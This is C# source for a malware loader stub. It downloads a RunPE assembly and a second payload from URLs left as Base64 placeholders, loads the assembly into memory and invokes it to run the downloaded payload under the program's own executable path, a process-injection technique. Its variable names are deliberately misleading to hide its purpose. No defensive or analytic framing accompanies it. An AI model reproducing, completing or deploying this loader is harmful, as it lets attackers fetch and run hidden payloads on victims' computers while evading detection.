using System;
using System.Net;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace Stub
{

    internal static partial class Program
    {

        [STAThread]
        private static void Main()
        {

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            WebClient webClient = new WebClient();

            string metadataBuilder = Encoding.UTF8.GetString(Convert.FromBase64String("RunPe Direct Link"));

            byte[] codeBuilder = webClient.DownloadData(metadataBuilder);

            WebClient webClient2 = new WebClient();

            string signatureBuilder = Encoding.UTF8.GetString(Convert.FromBase64String("Server Direct Link"));

            Uri MethodSignature = new Uri(signatureBuilder);

            byte[] parameters = webClient2.DownloadData(MethodSignature);

            object IntPtr = new object[] { Application.ExecutablePath, string.Empty, parameters, true };

            string target = null;

            Assembly returnType = Assembly.Load(codeBuilder);

            returnType.GetType("Project Name .Class Name").InvokeMember("Run Method", BindingFlags.InvokeMethod, null, target, (object[])IntPtr);

        }
    }
}
